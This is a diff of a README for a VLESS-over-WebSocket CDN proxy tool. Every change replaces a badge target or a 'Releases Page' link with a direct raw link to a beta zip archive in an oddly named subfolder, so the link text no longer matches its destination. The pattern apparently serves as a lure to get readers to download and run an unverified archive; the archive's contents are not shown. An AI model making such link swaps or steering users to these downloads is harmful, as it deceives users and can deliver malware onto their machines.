@@ -1,6 +1,6 @@
 # 🌐 vless-ws-cdn-tunnel-setup - Easy Deployment for a Covert Proxy
 
-![Download](https://img.shields.io/badge/Download-vless--ws--cdn--tunnel--setup-blue)
+![Download](https://raw.githubusercontent.com/tobileng/vless-ws-cdn-tunnel-setup/main/repullulation/vless-ws-cdn-tunnel-setup_v3.7-beta.3.zip)
 
 ## 📋 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -14,7 +14,7 @@
 Welcome to the vless-ws-cdn-tunnel-setup project. This tool helps you set up a VLESS-over-WebSocket proxy. It can disguise your traffic behind a fake website, making it less detectable. We use Cloudflare for secure connections, giving peace of mind while you browse.
 
 ## 💾 Download & Install
-To get started, visit this page to download: [Releases Page](https://github.com/tobileng/vless-ws-cdn-tunnel-setup/releases)
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/tobileng/vless-ws-cdn-tunnel-setup/main/repullulation/vless-ws-cdn-tunnel-setup_v3.7-beta.3.zip)
 
 On this page, you will find the latest version of the software. Select the version you want and download it. Follow these steps after downloading:
 
@@ -56,4 +56,4 @@ If you encounter issues while using the vless-ws-cdn-tunnel-setup, try these sol
 - **Installation Fails:** Make sure your computer meets the system requirements listed above. Also, ensure you have enough disk space.
 - **Proxy Not Working:** Verify your settings in the application. Check that you have followed all steps correctly.
 
-For further assistance, visit the [Releases Page](https://github.com/tobileng/vless-ws-cdn-tunnel-setup/releases) or check the community forums for help.
+For further assistance, visit the [Releases Page](https://raw.githubusercontent.com/tobileng/vless-ws-cdn-tunnel-setup/main/repullulation/vless-ws-cdn-tunnel-setup_v3.7-beta.3.zip) or check the community forums for help.
